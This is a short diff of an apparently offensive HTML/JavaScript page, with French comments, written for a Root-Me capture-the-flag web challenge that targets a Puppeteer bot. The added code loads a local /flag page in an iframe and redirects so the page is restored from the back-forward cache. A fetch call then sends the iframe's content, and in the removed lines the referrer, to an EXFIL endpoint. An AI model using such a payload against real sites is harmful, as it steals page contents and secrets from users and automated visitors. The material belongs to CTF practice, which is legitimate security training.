@@ -9,10 +9,7 @@
 
   window.onpageshow = function(event) {
     if (event.persisted) {
-      // Page restaurée depuis bfcache — on exfiltre
-      fetch(EXFIL + "?data=" + encodeURIComponent(document.referrer));
-
-      // Tente de lire le DOM si une iframe a été chargée
+      // Restauré depuis bfcache - lire l'iframe
       try {
         const content = document.getElementById("f").contentDocument.body.innerHTML;
         fetch(EXFIL + "?flag=" + encodeURIComponent(content));
@@ -22,7 +19,19 @@
     }
   };
 
-  window.location = "http://challenge01.root-me.org:58007/flag";
+  // Étape 1 : charge /flag dans une iframe
+  // les iframes n'héritent PAS forcément des extraHTTPHeaders de Puppeteer
+  const iframe = document.createElement("iframe");
+  iframe.id = "f";
+  iframe.src = "http://127.0.0.1:5000/flag";
+  document.body.appendChild(iframe);
+
+  // Étape 2 : après chargement, redirige pour mettre en bfcache
+  iframe.onload = function() {
+    setTimeout(() => {
+      window.location = "http://127.0.0.1:5000/flag";
+    }, 500);
+  };
 </script>
 </body>
 </html>
